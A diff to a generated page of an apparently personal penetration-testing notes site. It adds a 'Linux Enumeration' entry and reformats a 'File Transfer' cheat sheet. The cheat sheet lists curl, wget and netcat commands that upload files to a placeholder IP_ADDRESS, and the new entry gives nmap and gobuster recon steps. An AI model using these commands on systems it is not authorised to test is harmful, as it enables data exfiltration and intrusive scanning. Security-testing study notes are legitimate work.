@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-04-20T12:45:24 EDT">
+<meta name="revised" content="2019-04-23T00:06:34 EDT">
 <title>Concept :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -85,6 +85,13 @@
     <div>
         <a href="/concepts/file-transfer/">
             File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/linux_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/linux_enum/">
+            Linux Enumeration
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
@@ -474,6 +481,7 @@
     <option value="/concepts/"  selected>
    Concept</option> 
       <option value="/concepts/file-transfer/" >- File Transfer</option>
+      <option value="/concepts/linux_enum/" >- Linux Enumeration</option>
     <option value="/concepts/webapppentest/" >
   - 
    WebAppPenTests</option>
@@ -520,7 +528,20 @@
 
 <span><card>
 		<a href="/concepts/file-transfer/" >File Transfer</a></card>
-<p>##################Linux########################## 1# Python http server listener = python3 -m http.server 9090 listener = python -m simpleHTTPServer 9090 upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn't support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender &lt;, reciever &gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 &lt; file.</p>
+<p>######## LI/NUX #########
+Python http server
+python3 -m http.server 9090 python -m simpleHTTPServer 9090  Curl
+upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file  wget
+upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename  NetCat File Transfer
+Netcat notice with this method , sender &lt;, reciever &gt;. -w wait, -l listener -p port
+upload = nc -w 3 [your_ip] 1337 &lt; file.txt listener = nc -lp 1337 &gt; file.</p>
+</span>
+
+<span><card>
+		<a href="/concepts/linux_enum/" >Linux Enumeration</a></card>
+<p>I always start with nmap i use TCP Connect switch, then move to targeted scans. Then i run a full udp scan. While udp is being scanned. I will then move to gobuster, start manual enumeration. Things to look for are input fields of any kind, look for php parameters/actions in the source.
+nmap
+nmap -sT -p- -T5 -oA nmap/tcpconnect ipaddr nmap -sC -sV -T4 -pport,port,port -oA nmap/targeted ipaddr nmap -sU -p- -T5 -oA nmap/udp ipaddr  Gobuster</p>
 </span>
 
 <span><card>
